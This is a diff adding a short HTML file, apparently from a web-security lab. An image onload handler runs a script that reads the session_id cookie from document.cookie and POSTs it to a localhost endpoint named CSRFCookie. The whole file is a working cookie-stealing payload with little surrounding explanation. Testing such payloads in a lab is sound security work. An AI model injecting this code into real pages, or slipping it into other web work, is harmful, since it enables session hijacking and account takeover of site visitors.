@@ -1,0 +1,32 @@
+<img src="http://localhost:8080/static/cookie.png" onload="Cookie()"/>
+<script>
+    const Cookie = async () => {
+        const match = document.cookie.match(/session_id=([^;]+)/);
+        let sessionId;
+        if (match) {
+            sessionId = match[1];
+            console.log("Session ID from cookie: " + sessionId);
+            const requestOptions = {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: `session_id=${sessionId}`
+                // credentials: 'include'  // Include credentials to send cookies
+            };
+            fetch('http://localhost:8080/CSRFCookie', requestOptions)
+                .then(response => {
+                    if (response.ok) {
+                        // return response.json();
+                        console.log("thanks")
+                        return
+                    } else {
+                        throw new Error('Network response was not ok');
+                    }
+                })
+                .catch(error => console.error('There was a problem with the fetch operation:', error));
+            console.log("test");
+        } else {
+            console.log("session_id cookie not found");
+        }
+    };
+
+</script>
